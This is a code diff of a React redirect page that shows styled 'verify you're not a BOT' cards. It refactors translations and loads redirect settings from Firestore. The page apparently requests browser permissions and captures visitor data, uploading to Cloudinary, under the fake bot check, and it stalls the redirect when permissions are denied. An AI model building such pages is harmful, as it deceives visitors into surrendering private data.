@@ -1,11 +1,11 @@
 import * as React from 'react';
 import { useParams } from 'react-router-dom';
 import type { Settings, CapturedData, PermissionType } from '../types';
-import { useLanguage } from '../contexts/LanguageContext';
+import { getTranslator } from '../contexts/LanguageContext';
 import { useNotification } from '../contexts/SettingsContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
 import { db } from '../firebase';
-import { collection, addDoc } from 'firebase/firestore';
+import { collection, addDoc, query, where, getDocs } from 'firebase/firestore';
 
 interface RedirectPageProps {
   previewSettings?: Settings | Omit<Settings, 'id'>;
@@ -14,9 +14,8 @@ interface RedirectPageProps {
   onClosePreview?: () => void;
 }
 
-const VerificationText: React.FC<{className?: string}> = ({ className }) => {
-    const { t } = useLanguage();
-    return <p className={`text-xs font-semibold uppercase tracking-wider ${className}`}>We need to verify you're not a BOT</p>
+const VerificationText: React.FC<{className?: string, t: (key: string) => string;}> = ({ className, t }) => {
+    return <p className={`text-xs font-semibold uppercase tracking-wider ${className}`}>{t('redirect_verify_bot')}</p>
 }
 
 // --- Individual Card Style Components ---
@@ -58,8 +57,7 @@ const TypewriterText: React.FC<{ text: string, duration: number, isPaused: boole
     return <span className={`${className} overflow-hidden whitespace-nowrap border-r-4 border-r-transparent`}>{displayedText}</span>;
 }
 
-const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
       <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
         <div className="bg-white border border-slate-200/80 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
@@ -67,7 +65,7 @@ const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({
           <h1 className="text-4xl font-bold text-blue-600 leading-tight">{settings.displayText}</h1>
           <p className="text-slate-500 mt-1">{t('redirect_default_card_subtitle')}</p>
           <div className="w-full pt-6 space-y-2">
-            <VerificationText className="text-slate-400" />
+            <VerificationText className="text-slate-400" t={t} />
             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
           </div>
         </div>
@@ -75,8 +73,7 @@ const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({
     );
 };
 
-const GlassCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
             <div className="bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
@@ -84,29 +81,27 @@ const GlassCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settin
                 <h1 className="text-4xl font-bold leading-tight">{settings.displayText}</h1>
                 <p className="opacity-80 mt-1">{t('redirect_glass_card_subtitle')}</p>
                 <div className="w-full pt-6 space-y-2">
-                    <VerificationText className="text-white/60"/>
+                    <VerificationText className="text-white/60" t={t}/>
                     <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                 </div>
             </div>
         </div>
     );
 };
-const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-2xl animate-fade-in-up text-center flex flex-col items-center gap-6 p-8" style={{ color: settings.textColor, textShadow: '0px 1px 10px rgba(0,0,0,0.5)' }}>
             {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 object-contain" />}
             <h1 className="text-5xl font-extrabold leading-tight">{settings.displayText}</h1>
             <p className="opacity-80 text-lg">{t('redirect_minimal_card_subtitle')}</p>
             <div className="w-full pt-4 fixed bottom-0 left-0 space-y-2">
-                <VerificationText className="text-white/60 text-center mb-1"/>
+                <VerificationText className="text-white/60 text-center mb-1" t={t}/>
                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
             </div>
         </div>
     );
 };
-const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-2xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
             <div className="bg-[#0D1117] border border-green-500/30 shadow-2xl rounded-lg p-6">
@@ -121,7 +116,7 @@ const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ set
                     <p>{'>'} {t('redirect_terminal_target')} <span className="text-cyan-400">{settings.redirectUrl}</span></p>
                     <p className="mb-2">{'>'} {t('redirect_terminal_message')} <span className="text-white">{settings.displayText}</span></p>
                     <div className="space-y-2">
-                        <VerificationText className="text-green-500/80"/>
+                        <VerificationText className="text-green-500/80" t={t}/>
                         <div className="flex items-center gap-2">
                             <span>{'>'} {t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} </span>
                             <div className="flex-1 bg-green-900 h-6 rounded-sm overflow-hidden">
@@ -135,21 +130,20 @@ const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ set
     );
 };
 
-const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => (
+const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
   <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
     <div className="bg-slate-900 border border-slate-700 shadow-2xl rounded-lg p-8 sm:p-12 text-center flex flex-col items-center gap-6">
       {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-2 object-contain" />}
       <h1 className="text-4xl font-semibold leading-tight">{settings.displayText}</h1>
       <div className="w-full pt-6 space-y-2">
-        <VerificationText className="text-slate-400"/>
+        <VerificationText className="text-slate-400" t={t}/>
         <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
       </div>
     </div>
   </div>
 );
 
-const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-2xl animate-fade-in-up" style={{ color: settings.textColor }}>
             <div className="bg-white p-12 rounded-lg shadow-2xl">
@@ -168,7 +162,7 @@ const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
                     </div>
                 </div>
                  <div className="w-full pt-8 space-y-2">
-                    <VerificationText className="text-slate-400"/>
+                    <VerificationText className="text-slate-400" t={t}/>
                     <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1 bg-slate-200" progressClassName="bg-indigo-500 h-full" />
                 </div>
             </div>
@@ -176,8 +170,7 @@ const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
     );
 };
 
-const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     const gradientStyle = {
         backgroundSize: '400% 400%',
         backgroundImage: `linear-gradient(-45deg, ${settings.gradientColors.join(', ')})`,
@@ -191,7 +184,7 @@ const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean }> = (
                     <h1 className="text-5xl font-extrabold leading-tight text-white" style={{textShadow: '0 2px 10px rgba(0,0,0,0.3)'}}>{settings.displayText}</h1>
                     <p className="text-white/80 mt-1">{t('redirect_gradient_card_subtitle')}</p>
                     <div className="w-full pt-6 space-y-2">
-                        <VerificationText className="text-white/60"/>
+                        <VerificationText className="text-white/60" t={t}/>
                         <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2.5 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                     </div>
                 </div>
@@ -200,8 +193,7 @@ const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean }> = (
     );
 };
 
-const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-md animate-fade-in" style={{ color: settings.textColor }}>
             <div className="bg-white/90 p-12 text-center flex flex-col items-center gap-4 relative">
@@ -210,15 +202,14 @@ const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
                 <h1 className="text-4xl font-serif font-bold text-black/80">{settings.displayText}</h1>
                 <p className="text-black/60 font-serif italic">{t('redirect_elegant_card_subtitle')}</p>
                 <div className="w-full pt-8 space-y-2">
-                    <VerificationText className="text-black/50"/>
+                    <VerificationText className="text-black/50" t={t}/>
                     <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
                 </div>
             </div>
         </div>
     );
 };
-const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
             <div className="bg-black p-2 rounded-2xl border-4 border-slate-800 shadow-inner shadow-slate-900">
@@ -228,7 +219,7 @@ const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
                         <TypewriterText text={settings.displayText} duration={2} isPaused={isPaused} />
                     </h1>
                     <div className="w-full absolute bottom-4 left-0 px-8 space-y-2">
-                        <VerificationText className="text-green-500/80 animate-flicker"/>
+                        <VerificationText className="text-green-500/80 animate-flicker" t={t}/>
                         <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-2 bg-green-900/50" progressClassName="bg-green-500 h-full" />
                     </div>
                 </div>
@@ -237,8 +228,7 @@ const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
     );
 };
 
-const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settings, isPaused }) => {
-    const { t } = useLanguage();
+const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
     return (
       <div className="w-full max-w-xl animate-scale-in font-sans" style={{ color: settings.textColor }}>
         <div className="bg-black border border-slate-700 shadow-2xl rounded-lg overflow-hidden">
@@ -256,7 +246,7 @@ const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ 
             <h1 className="text-xl font-bold text-white">{settings.displayText}</h1>
             <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', {url: settings.redirectUrl})}</p>
             <div className="pt-2 space-y-2">
-                <VerificationText className="text-slate-400"/>
+                <VerificationText className="text-slate-400" t={t}/>
                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2" progressClassName="bg-red-600 h-full rounded-full" />
             </div>
           </div>
@@ -292,13 +282,13 @@ const parseUserAgent = (ua: string) => {
 
 const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview: isPreviewProp, isEmbeddedPreview = false, onClosePreview }) => {
   const { data } = useParams<{ data: string }>();
-  const { t } = useLanguage();
   const addNotification = useNotification();
   
   const [settings, setSettings] = React.useState<Settings | null>(null);
   const [error, setError] = React.useState<string | null>(null);
   const [isPaused, setIsPaused] = React.useState(true);
   const [showDeniedPopup, setShowDeniedPopup] = React.useState(false);
+  const [t, setT] = React.useState(() => getTranslator('en'));
   
   const isPreview = !!isPreviewProp;
   const isMounted = React.useRef(true);
@@ -309,29 +299,43 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   }, []);
 
   React.useEffect(() => {
-    let configToLoad: Settings;
-    if (previewSettings) {
-        configToLoad = 'id' in previewSettings ? previewSettings as Settings : { ...NEW_REDIRECT_TEMPLATE, ...previewSettings, id: 'preview' } as Settings;
-        setSettings(configToLoad);
-        setIsPaused(false);
-        return;
-    }
+    const loadData = async () => {
+        if (previewSettings) {
+            const configToLoad = 'id' in previewSettings 
+                ? previewSettings as Settings 
+                : { ...NEW_REDIRECT_TEMPLATE, ...previewSettings, id: 'preview' } as Settings;
+            setSettings(configToLoad);
+            setT(() => getTranslator(configToLoad.redirectLanguage || 'en'));
+            setIsPaused(false);
+            return;
+        }
 
-    if (!data) {
-      setError(t('redirect_invalid_link_subtitle'));
-      return;
-    }
+        if (!data) {
+          setError(t('redirect_invalid_link_subtitle'));
+          return;
+        }
 
-    try {
-      const decodedString = atob(data);
-      const parsedSettings = JSON.parse(decodedString);
-      configToLoad = { ...NEW_REDIRECT_TEMPLATE, ...parsedSettings };
-      setSettings(configToLoad);
-      setIsPaused(!isPreview); 
-    } catch (e) {
-      console.error("Invalid redirect data in URL:", e);
-      setError(t('redirect_invalid_link_subtitle'));
-    }
+        try {
+          const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
+          const querySnapshot = await getDocs(q);
+
+          if (querySnapshot.empty) {
+            setError(t('redirect_invalid_link_subtitle'));
+            return;
+          }
+          
+          const doc = querySnapshot.docs[0];
+          const configToLoad = { id: doc.id, ...doc.data() } as Settings;
+          
+          setSettings(configToLoad);
+          setT(() => getTranslator(configToLoad.redirectLanguage));
+          setIsPaused(!isPreview);
+        } catch (e) {
+          console.error("Invalid redirect data in URL:", e);
+          setError(t('redirect_invalid_link_subtitle'));
+        }
+    };
+    loadData();
   }, [data, previewSettings, isPreview, t]);
 
 
@@ -358,7 +362,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
     };
 
     const handleDataCapture = async () => {
-        const redirectId = (settings as any).redirectId;
+        const redirectId = settings.id;
         if (!redirectId) {
             console.error("Could not save capture data: redirectId is missing from payload.");
             startRedirectSequence(); // Fail gracefully and just redirect
@@ -472,7 +476,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
       startRedirectSequence();
     }
 
-  }, [settings, isPreview, isPaused, t, addNotification]);
+  }, [settings, isPreview, isPaused, addNotification]);
   
   const handleClosePreview = () => onClosePreview?.();
 
@@ -496,7 +500,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   
   const renderCard = () => {
     // If permissions were denied, isPaused will be true, halting the progress bar.
-    const props = { settings, isPaused: isPreview || isPaused };
+    const props = { settings, isPaused: isPreview || isPaused, t };
     return (
       <div className={`relative transition-all duration-300 ${showDeniedPopup ? 'blur-md' : ''}`}>
         {(() => {
